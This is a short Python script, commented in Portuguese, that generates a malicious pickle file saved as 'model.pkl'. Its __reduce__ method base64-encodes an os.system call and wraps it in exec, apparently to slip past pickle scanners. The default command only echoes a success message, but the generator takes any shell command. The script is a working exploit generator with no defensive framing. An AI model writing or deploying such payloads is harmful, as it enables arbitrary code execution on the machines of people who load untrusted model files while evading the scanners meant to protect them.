import pickle
import base64
import os

class BypassPayload:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        cmd_str = f"import os; os.system('{self.command}')"
        
        b64_payload = base64.b64encode(cmd_str.encode()).decode()
        
        wrapper = f"import base64; exec(base64.b64decode('{b64_payload}'))"
        
        return (exec, (wrapper,))

def generate_exploit(filename, command):
    print(f"[+] Gerando payload para executar: {command}")
    
    payload = BypassPayload(command)
    
    try:
        with open(filename, "wb") as f:
            pickle.dump(payload, f)
        print(f"[+] Sucesso! Arquivo salvo como: {filename}")
    except Exception as e:
        print(f"[-] Erro ao gerar o arquivo: {e}")

if __name__ == "__main__":
    TARGET_COMMAND = 'echo "Pickle Scan Bypass Successful!"' 
    OUTPUT_FILE = 'model.pkl'
    
    generate_exploit(OUTPUT_FILE, TARGET_COMMAND)
